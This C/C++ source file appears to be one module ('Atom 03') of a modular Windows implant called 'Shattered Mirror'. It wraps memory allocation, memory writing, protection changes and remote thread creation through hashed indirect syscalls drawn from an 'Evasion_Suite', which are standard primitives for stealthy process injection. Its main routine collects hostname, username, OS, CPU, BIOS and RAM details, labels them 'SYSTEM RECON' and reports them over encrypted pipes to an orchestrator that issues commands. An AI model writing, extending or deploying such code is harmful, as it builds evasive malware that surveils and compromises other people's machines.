/*=============================================================================
 * Shattered Mirror v1 — Atom 03: Syscall Linker / System Information
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports on report pipe.
 *===========================================================================*/

#include "Atom_03_Sys.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>

extern SYSCALL_TABLE g_SyscallTable;

static PSYSCALL_TABLE s_pMasterTable = NULL;

BOOL InitSyslink(void *pOrchestratorSyscallTable) {
  if (!pOrchestratorSyscallTable)
    return FALSE;
  s_pMasterTable = (PSYSCALL_TABLE)pOrchestratorSyscallTable;
  return TRUE;
}

NTSTATUS SysAlloc(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
                  PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
  if (!s_pMasterTable)
    return (NTSTATUS)0xC0000001;
  PSYSCALL_ENTRY pE =
      GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtAllocateVirtualMemory"));
  if (!pE)
    return (NTSTATUS)0xC0000001;
  return SyscallDispatch(pE, ProcessHandle, BaseAddress, ZeroBits, RegionSize,
                         AllocationType, Protect);
}

NTSTATUS SysWrite(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
                  SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
  if (!s_pMasterTable)
    return (NTSTATUS)0xC0000001;
  PSYSCALL_ENTRY pE =
      GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtWriteVirtualMemory"));
  if (!pE)
    return (NTSTATUS)0xC0000001;
  return SyscallDispatch(pE, ProcessHandle, BaseAddress, Buffer,
                         NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS SysProtect(HANDLE ProcessHandle, PVOID *BaseAddress,
                    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
  if (!s_pMasterTable)
    return (NTSTATUS)0xC0000001;
  PSYSCALL_ENTRY pE =
      GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtProtectVirtualMemory"));
  if (!pE)
    return (NTSTATUS)0xC0000001;
  return SyscallDispatch(pE, ProcessHandle, BaseAddress, RegionSize, NewProtect,
                         OldProtect);
}

NTSTATUS SysThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                   PSM_OBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
                   PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
                   SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
                   PSM_PS_ATTRIBUTE_LIST AttributeList) {
  if (!s_pMasterTable)
    return (NTSTATUS)0xC0000001;
  PSYSCALL_ENTRY pE =
      GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtCreateThreadEx"));
  if (!pE)
    return (NTSTATUS)0xC0000001;
  return SyscallDispatch(pE, ThreadHandle, DesiredAccess, ObjectAttributes,
                         ProcessHandle, StartRoutine, Argument, CreateFlags,
                         ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;

  // Debug console redirect
  FILE *fConsole = freopen("log\\atom3_console.txt", "a", stdout);
  if (fConsole)
    setvbuf(stdout, NULL, _IONBF, 0);

  FILE *fDbg = fopen("log\\atom3_debug.txt", "a");
  if (fDbg) {
    fprintf(fDbg, "Atom 3 started. Atom ID: %lu\n", dwAtomId);
    fclose(fDbg);
  }
  printf("[Atom 3] Started. Atom ID: %lu\n", dwAtomId);

  // 1. Connect to command pipe (receive commands from Orchestrator)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    printf("[Atom 3] IPC_ConnectToCommandPipe FAILED. Error: %lu\n",
           GetLastError());
    return 1;
  }
  printf("[Atom 3] Connected to command pipe.\n");

  // 2. Connect to report pipe (send reports to Orchestrator)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    printf("[Atom 3] IPC_ConnectToReportPipe FAILED. Error: %lu\n",
           GetLastError());
    CloseHandle(hCmdPipe);
    return 1;
  }
  printf("[Atom 3] Connected to report pipe.\n");

  InitSyslink(&g_SyscallTable);
  printf("[Atom 3] InitSyslink called.\n");

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  printf("[Atom 3] Sent CMD_READY.\n");

  // Collect and send immediate system info report
  char szHost[256] = {0}; DWORD dHost = sizeof(szHost);
  char szUser[256] = {0}; DWORD dUser = sizeof(szUser);
  GetComputerNameA(szHost, &dHost); GetUserNameA(szUser, &dUser);
  
  MEMORYSTATUSEX memInfo;
  memInfo.dwLength = sizeof(MEMORYSTATUSEX);
  GlobalMemoryStatusEx(&memInfo);
  DWORDLONG totalPhysMem = memInfo.ullTotalPhys / (1024 * 1024);

  char cpuName[256] = "Unknown CPU";
  char osName[256] = "Unknown OS";
  char buildNum[64] = "Unknown Build";
  char biosVer[256] = "Unknown BIOS";
  DWORD sz;
  HKEY hKey;

  // CPU Name
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
      sz = sizeof(cpuName);
      RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &sz);
      RegCloseKey(hKey);
  }

  // OS Info
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
      sz = sizeof(osName);
      RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)osName, &sz);
      sz = sizeof(buildNum);
      RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)buildNum, &sz);
      RegCloseKey(hKey);
  }

  // BIOS Info
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
      sz = sizeof(biosVer);
      RegQueryValueExA(hKey, "BIOSVersion", NULL, NULL, (LPBYTE)biosVer, &sz);
      RegCloseKey(hKey);
  }

  char report[2048];
  sprintf_s(report, 
            "\n=== SHATTERED SYSTEM RECON ===\n"
            "[+] Hostname   : %s\n"
            "[+] Username   : %s\n"
            "[+] OS Name    : %s\n"
            "[+] OS Build   : %s\n"
            "[+] CPU Model  : %s\n"
            "[+] BIOS Ver   : %s\n"
            "[+] Total RAM  : %llu MB\n"
            "==============================\n",
            szHost, szUser, osName, buildNum, cpuName, biosVer, totalPhysMem);
  printf("[Atom 3] Immediate report: %s\n", report);

  IPC_MESSAGE outMsg = {0};
  outMsg.dwSignature = 0x534D4952;
  outMsg.CommandId = CMD_REPORT;
  outMsg.dwPayloadLen = (DWORD)strlen(report);
  memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);

  if (IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16)) {
    printf("[Atom 3] Immediate IPC send successful.\n");
  } else {
    printf("[Atom 3] Immediate IPC send FAILED. Error: %lu\n", GetLastError());
  }

  // Main loop: wait for commands on command pipe
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          printf("[Atom 3] Received CMD_EXECUTE. Re-collecting sysinfo.\n");
          // Re-collect and send fresh sysinfo
          char szHost[256] = {0}; DWORD dHost = sizeof(szHost);
          char szUser[256] = {0}; DWORD dUser = sizeof(szUser);
          GetComputerNameA(szHost, &dHost); GetUserNameA(szUser, &dUser);
          
          MEMORYSTATUSEX memInfo;
          memInfo.dwLength = sizeof(MEMORYSTATUSEX);
          GlobalMemoryStatusEx(&memInfo);
          DWORDLONG totalPhysMem = memInfo.ullTotalPhys / (1024 * 1024);

          char cpuName[256] = "Unknown CPU";
          char osName[256] = "Unknown OS";
          char buildNum[64] = "Unknown Build";
          char biosVer[256] = "Unknown BIOS";
          DWORD sz;
          HKEY hKey;

          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
              sz = sizeof(cpuName);
              RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &sz);
              RegCloseKey(hKey);
          }
          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
              sz = sizeof(osName);
              RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)osName, &sz);
              sz = sizeof(buildNum);
              RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)buildNum, &sz);
              RegCloseKey(hKey);
          }
          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
              sz = sizeof(biosVer);
              RegQueryValueExA(hKey, "BIOSVersion", NULL, NULL, (LPBYTE)biosVer, &sz);
              RegCloseKey(hKey);
          }

          char freshReport[2048];
          sprintf_s(freshReport, 
                    "\n=== SHATTERED SYSTEM RECON ===\n"
                    "[+] Hostname   : %s\n"
                    "[+] Username   : %s\n"
                    "[+] OS Name    : %s\n"
                    "[+] OS Build   : %s\n"
                    "[+] CPU Model  : %s\n"
                    "[+] BIOS Ver   : %s\n"
                    "[+] Total RAM  : %llu MB\n"
                    "==============================\n",
                    szHost, szUser, osName, buildNum, cpuName, biosVer, totalPhysMem);

          IPC_MESSAGE rptMsg = {0};
          rptMsg.dwSignature = 0x534D4952;
          rptMsg.CommandId = CMD_REPORT;
          rptMsg.dwPayloadLen = (DWORD)strlen(freshReport);
          memcpy(rptMsg.Payload, freshReport, rptMsg.dwPayloadLen);
          IPC_SendMessage(hReportPipe, &rptMsg, SharedSessionKey, 16);
          printf("[Atom 3] Fresh sysinfo sent.\n");
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          printf("[Atom 3] Received CMD_TERMINATE. Exiting.\n");
          break;
        }
      }
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}